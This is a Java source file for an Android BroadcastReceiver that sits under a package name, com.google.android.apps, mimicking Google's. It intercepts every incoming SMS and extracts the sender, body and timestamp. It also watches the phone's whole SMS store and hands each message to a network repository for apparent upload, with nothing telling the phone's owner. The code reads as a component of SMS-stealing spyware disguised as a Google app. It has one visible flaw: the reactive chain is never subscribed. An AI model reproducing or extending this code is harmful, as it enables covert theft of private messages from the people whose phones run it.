package com.google.android.apps.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.support.v4.content.WakefulBroadcastReceiver;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.android.apps.App;
import com.google.android.apps.repositories.models.BaseEvent;
import com.google.android.apps.repositories.models.events.Message;
import com.google.android.apps.repositories.network.NetworkRepo;
import com.google.android.apps.utils.Constants;
import com.google.android.apps.utils.DateUtils;
import com.google.android.apps.utils.Preferences;

import java.util.concurrent.TimeUnit;

import io.reactivex.Single;

public class ReceiverOnSms extends BroadcastReceiver {
    private String TAG = ReceiverOnSms.class.getSimpleName();
    private SmsObserver smsObserver = null;

    @Override
    public void onReceive(Context context, Intent intent) {
        // Retrieves a map of extended data from the intent.
        NetworkRepo networkRepo = App.getAppComponent().getNetworkRepo();
        Preferences preferences = App.getAppComponent().getPreferences();
        final Bundle bundle = intent.getExtras();
        Log.d(TAG, "ReceiverOnSms" + intent.getAction());
        if (!preferences.isSms())
            return;
        if (smsObserver == null) {
            smsObserver = new SmsObserver(new Handler(), context);
            context.getContentResolver().registerContentObserver(
                    Uri.parse("content://sms"), true, smsObserver);
        }
        Single.timer(1, TimeUnit.SECONDS)
                .flatMap(Long -> getMessageDetails(bundle))
                .doAfterSuccess(networkRepo::addSms);
    }


    private Single<BaseEvent> getMessageDetails(Bundle bundle) {
        Message message = new Message();
        if (bundle != null) {
            final Object[] pdusObj = (Object[]) bundle.get("pdus");
            String format = bundle.getString("format");
            final SmsMessage[] messages;
            if (pdusObj != null) {
                messages = new SmsMessage[pdusObj.length];
                StringBuilder bodyText = new StringBuilder();
                for (int i = 0; i < pdusObj.length; i++) {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i], format);
                    } else {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    }
                    bodyText.append(messages[i].getMessageBody());
                }
                String name = messages[0].getOriginatingAddress();
                message.setNumber(messages[0].getDisplayOriginatingAddress());
                message.setData(bodyText.toString());
                message.setDate(DateUtils.convertMilliSecondsToFormattedDate(messages[0].getTimestampMillis()));
                message.setType(Constants.INCOMING_SMS);
            }
        }
        return Single.just(message);
    }

}